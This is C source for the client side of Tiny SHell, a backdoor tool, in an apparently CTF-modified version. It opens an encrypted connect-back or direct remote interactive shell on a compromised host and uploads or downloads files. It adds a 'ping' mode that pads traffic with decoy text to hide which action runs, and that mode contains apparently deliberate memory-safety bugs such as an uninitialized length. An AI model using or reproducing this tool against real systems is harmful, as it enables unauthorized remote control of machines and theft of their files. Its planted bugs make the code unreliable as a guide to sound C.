/*
 * Tiny SHell version 0.6 - client side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <termios.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <fcntl.h>
#include <netdb.h>

#include "tsh.h"
#include "pel.h"

unsigned char message[BUFSIZE + 1];

/* function declaration */

int tsh_get_file( int server, char *argv3, char *argv4 );
int tsh_put_file( int server, char *argv3, char *argv4 );
int tsh_runshell( int server, char *argv2 );
int tsh_ping( int server, char *argv3 );

void pel_error( char *s );

/* program entry point */

int safe_atoi(char * s) {
    unsigned long i = 0;
    for (i = 0; i < strlen(s); i++) {
        if (!isdigit(s[i])) return -1;
    }
    return atoi(s);
}

int main( int argc, char *argv[] )
{
    int ret, client, server;
    socklen_t n;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;
    unsigned char action;

    /* check the arguments */

    action = RUNSHELL;

    if ( argc == 5) {
        if (! strcmp(argv[2], "get") || !strcmp(argv[2], "GET")) {
            action = GET_FILE;

        } else if (!strcmp(argv[2], "put") || !strcmp(argv[2], "PUT")) {
            action = PUT_FILE;
        }
    } else if (argc < 2) {
        fprintf(stderr, "tsh <hostname> [command] ...\n");
        return 0;
    } else if (argc >= 3) {
        if (!strcmp(argv[2], "ping") || !strcmp(argv[2], "ping")) {
             action = PING;
        }
    }

    int guess_fd = safe_atoi(argv[1]);
    if (guess_fd > 0) {
        /* inherit server fd */
        server = guess_fd;
    } else if( strcmp( argv[1], "cb" ) != 0 )
    {
        /* create a socket */

        server = socket( AF_INET, SOCK_STREAM, 0 );

        if( server < 0 )
        {
            perror( "socket" );
            return( 2 );
        }

        /* resolve the server hostname */

        if (inet_aton(argv[1], &server_addr.sin_addr) == 0) {
            perror("inet_aton");
            return (3);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port   = htons( SERVER_PORT );

        /* connect to the remote host */

        ret = connect( server, (struct sockaddr *) &server_addr,
                       sizeof( server_addr ) );

        if( ret < 0 )
        {
            perror( "connect" );
            return( 4 );
        }
    }
    else
    {
        /* create a socket */

        client = socket( AF_INET, SOCK_STREAM, 0 );

        if( client < 0 )
        {
            perror( "socket" );
            return( 5 );
        }

        /* bind the client on the port the server will connect to */

        n = 1;

        ret = setsockopt( client, SOL_SOCKET, SO_REUSEADDR,
                          (void *) &n, sizeof( n ) );

        if( ret < 0 )
        {
            perror( "setsockopt" );
            return( 6 );
        }

        client_addr.sin_family      = AF_INET;
        client_addr.sin_port        = htons( SERVER_PORT );
        client_addr.sin_addr.s_addr = INADDR_ANY;

        ret = bind( client, (struct sockaddr *) &client_addr,
                    sizeof( client_addr ) );

        if( ret < 0 )
        {
            perror( "bind" );
            return( 7 );
        }

        if( listen( client, 5 ) < 0 )
        {
            perror( "listen" );
            return( 8 );
        }

        fprintf( stderr, "Waiting for the server to connect..." );
        fflush( stderr );

        n = sizeof( server_addr );

        server = accept( client, (struct sockaddr *)&server_addr, &n );

        if( server < 0 )
        {
            perror( "accept" );
            return( 9 );
        }

        fprintf( stderr, "connected.\n" );

        close( client );
    }

    /* setup the packet encryption layer */

    /* using the built-in secret key */

    // alarm(3);

    ret = pel_client_init( server, secret );

    if( ret != PEL_SUCCESS )
    {
        close( server );

        fprintf(stderr, "client init returned %d\n", ret);

        shutdown( server, 2 );
        return 10;

    }

    alarm(0);

    /* send the action requested by the user */

    ret = pel_send_msg( server, (unsigned char *) &action, 1 );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        shutdown( server, 2 );
        return( 11 );
    }

    /* howdy */

    switch( action )
    {
        case GET_FILE:

            ret = tsh_get_file( server, argv[3], argv[4] );
            break;

        case PUT_FILE:

            ret = tsh_put_file( server, argv[3], argv[4] );
            break;

        case RUNSHELL:

            ret = ( ( argc == 3 )
                ? tsh_runshell( server, argv[2] )
                : tsh_runshell( server, "exec bash --login" ) );
            break;

        case PING:

            ret = tsh_ping(server, argv[3]);

        default:

            ret = -1;
            break;
    }

    shutdown( server, 2 );

    return( ret );
}

int tsh_ping(int server, char * argv3) {
    int ret, len, arglen, rs;
    arglen = strlen( argv3 );

    // send some garbage first, so that it's hard to tell which action call from encrypted network flow.
    unsigned char * garbage = "Strapdown-Zeta is a git-powered wiki system for hackers, derived from strapdown.js project.\n Strapdown.js makes it embarrassingly simple to create elegant Markdown documents. No server-side compilation required. \nStrapdown-Zeta add more features including a standalone server providing a git powered wiki system, on top of libgit2, we don't want any potential command injections! Project URL https://github.com/zTrix/strapdown-zeta\n" \
    "And it's not over, I would also recommend another project called zio: https://github.com/zTrix/zio  \nyou will find it very useful for io interaction in CTF. Yeah, it's absolutely free, but notice the license before using :)\n";
    pel_send_msg(server, garbage, 432 + 224);

    int i;
    int checksum = 0;

    while (1) {
        memcpy(message, "ping ", 5);

        if (len > BUFSIZE) {
            memcpy(&message[5], argv3, arglen);
        } else {

            message[5] = ' ';
            memcpy(&message[6], &len, 4);

            for (i = 10; i < BUFSIZE; i++) {
                if (message[i] < 32 || message[i] >= 127) {
                    if (i < arglen + 10) {
                        message[i] = argv3[i-10];
                    } else {
                        len = i;
                        break;
                    }
                }
            }
        }

        for (i = 0; i < 32; i++) {
            if (message[i] >= 32 && message[i] < 128) {
                printf("%c", message[i]);
            } else {
                printf("\\x%02X", message[i]);
            }
        }
        printf("\n");
        
        rs = pel_send_msg(server, message, len);

        ret = pel_recv_msg( server, message, &len );

        if ( ret != PEL_SUCCESS ) {
            if ( pel_errno == PEL_CONN_CLOSED)
            {
                break;
            }

            pel_error( "pel_recv_msg" );

            pel_debug = 1;
            pel_send_all(server, "bad msg format!\n", 16, 0);
            continue;
        } else {
            checksum = pel_checksum(message, len);
            printf("checksum = %d\n", checksum);
        }
    }
    return 0;
}

int tsh_get_file( int server, char *argv3, char *argv4 )
{
    char *temp, *pathname;
    int ret, len, fd, total;

    /* send remote filename */

    len = strlen( argv3 );

    ret = pel_send_msg( server, (unsigned char *) argv3, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 12 );
    }

    /* create local file */

    temp = strrchr( argv3, '/' );

    if( temp != NULL ) temp++;
    if( temp == NULL ) temp = argv3;

    len = strlen( argv4 );

    pathname = (char *) malloc( len + strlen( temp ) + 2 );

    if( pathname == NULL )
    {
        perror( "malloc" );
        return( 13 );
    }

    strcpy( pathname, argv4 );
    strcpy( pathname + len, "/" );
    strcpy( pathname + len + 1, temp );

    fd = creat( pathname, 0644 );

    if( fd < 0 )
    {
        perror( "creat" );
        return( 14 );
    }

    free( pathname );

    /* transfer from server */

    total = 0;

    while( 1 )
    {
        ret = pel_recv_msg( server, message, &len );

        if( ret != PEL_SUCCESS )
        {
            if( pel_errno == PEL_CONN_CLOSED && total > 0 )
            {
                break;
            }

            pel_error( "pel_recv_msg" );
            fprintf( stderr, "Transfer failed.\n" );

            pel_debug = 1;
            pel_send_all(server, "cannot parse recved msg", strlen("cannot parse recved msg"), 0);
            continue;
        }

        if( write( fd, message, len ) != len )
        {
            perror( "write" );
            return( 16 );
        }

        total += len;

        printf( "%d\r", total );
        fflush( stdout );
    }

    printf( "%d done.\n", total );

    return( 0 );
}

int tsh_put_file( int server, char *argv3, char *argv4 )
{
    char *temp, *pathname;
    int ret, len, fd, total;

    /* send remote filename */

    temp = strrchr( argv3, '/' );

    if( temp != NULL ) temp++;
    if( temp == NULL ) temp = argv3;

    len = strlen( argv4 );

    pathname = (char *) malloc( len + strlen( temp ) + 2 );

    if( pathname == NULL )
    {
        perror( "malloc" );
        return( 17 );
    }

    strcpy( pathname, argv4 );
    strcpy( pathname + len, "/" );
    strcpy( pathname + len + 1, temp );

    len = strlen( pathname );

    ret = pel_send_msg( server, (unsigned char *) pathname, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 18 );
    }

    free( pathname );

    /* open local file */

    fd = open( argv3, O_RDONLY );

    if( fd < 0 )
    {
        perror( "open" );
        return( 19 );
    }

    /* transfer to server */

    total = 0;

    while( 1 )
    {
        len = read( fd, message, BUFSIZE );

        if( len < 0 )
        {
            perror( "read" );
            return( 20 );
        }

        if( len == 0 )
        {
            break;
        }

        ret = pel_send_msg( server, message, len );

        if( ret != PEL_SUCCESS )
        {
            pel_error( "pel_send_msg" );
            fprintf( stderr, "Transfer failed.\n" );
            return( 21 );
        }

        total += len;

        printf( "%d\r", total );
        fflush( stdout );
    }

    printf( "%d done.\n", total );

    return( 0 );
}

int tsh_runshell( int server, char *argv2 )
{
    fd_set rd;
    char *term;
    int ret, len, imf;
    struct winsize ws;
    struct termios tp, tr;

    /* send the TERM environment variable */

    term = getenv( "TERM" );

    if( term == NULL )
    {
        term = "vt100";
    }

    len = strlen( term );

    ret = pel_send_msg( server, (unsigned char *) term, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 22 );
    }

    /* send the window size */

    imf = 0;

    if( isatty( 0 ) )
    {
        /* set the interactive mode flag */

        imf = 1;

        if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
        {
            perror( "ioctl(TIOCGWINSZ)" );
            return( 23 );
        }
    }
    else
    {
        /* fallback on standard settings */

        ws.ws_row = 25;
        ws.ws_col = 80;
    }

    message[0] = ( ws.ws_row >> 8 ) & 0xFF;
    message[1] = ( ws.ws_row      ) & 0xFF;

    message[2] = ( ws.ws_col >> 8 ) & 0xFF;
    message[3] = ( ws.ws_col      ) & 0xFF;

    ret = pel_send_msg( server, message, 4 );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 24 );
    }

    /* send the system command */

    len = strlen( argv2 );

    ret = pel_send_msg( server, (unsigned char *) argv2, len );

    if( ret != PEL_SUCCESS )
    {
        pel_error( "pel_send_msg" );
        return( 25 );
    }

    /* set the tty to RAW */

    if( isatty( 1 ) )
    {
        if( tcgetattr( 1, &tp ) < 0 )
        {
            perror( "tcgetattr" );
            return( 26 );
        }

        memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
        tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN]  = 1;
        tr.c_cc[VTIME] = 0;

        if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 )
        {
            perror( "tcsetattr" );
            return( 27 );
        }
    }

    /* let's forward the data back and forth */

    while( 1 )
    {
        FD_ZERO( &rd );

        if( imf != 0 )
        {
            FD_SET( 0, &rd );
        }

        FD_SET( server, &rd );

        if( select( server + 1, &rd, NULL, NULL, NULL ) < 0 )
        {
            perror( "select" );
            ret = 28;
            break;
        }

        if( FD_ISSET( server, &rd ) )
        {
            ret = pel_recv_msg( server, message, &len );

            if( ret != PEL_SUCCESS )
            {
                if( pel_errno == PEL_CONN_CLOSED )
                {
                    ret = 0;
                    break;
                }
                else
                {
                    pel_error( "pel_recv_msg" );
                    ret = 29;
                    // debug
                    pel_debug = 1;
                    pel_send_all(server, "cannot parse recved msg", strlen("cannot parse recved msg"), 0);
                    continue;
                }
            }

            if( write( 1, message, len ) != len )
            {
                perror( "write" );
                ret = 30;
                break;
            }
        }

        if( imf != 0 && FD_ISSET( 0, &rd ) )
        {
            len = read( 0, message, BUFSIZE );

            if( len == 0 )
            {
                fprintf( stderr, "stdin: end-of-file\n" );
                ret = 31;
                break;
            }

            if( len < 0 )
            {
                perror( "read" );
                ret = 32;
                break;
            }

            ret = pel_send_msg( server, message, len );

            if( ret != PEL_SUCCESS )
            {
                pel_error( "pel_send_msg" );
                ret = 33;
                break;
            }
        }
    }

    /* restore the terminal attributes */

    if( isatty( 1 ) )
    {
        tcsetattr( 1, TCSADRAIN, &tp );
    }

    return( ret );
}

void pel_error( char *s )
{
    switch( pel_errno )
    {
        case PEL_CONN_CLOSED:

            fprintf( stderr, "%s: Connection closed.\n", s );
            break;

        case PEL_SYSTEM_ERROR:

            perror( s );
            break;

        case PEL_WRONG_CHALLENGE:

            fprintf( stderr, "%s: Wrong challenge.\n", s );
            break;

        case PEL_BAD_MSG_LENGTH:

            fprintf( stderr, "%s: Bad message length.\n", s );
            break;

        case PEL_CORRUPTED_DATA:

            fprintf( stderr, "%s: Corrupted data.\n", s );
            break;

        case PEL_UNDEFINED_ERROR:

            fprintf( stderr, "%s: No error.\n", s );
            break;

        default:

            fprintf( stderr, "%s: Unknown error code.\n", s );
            break;
    }
}
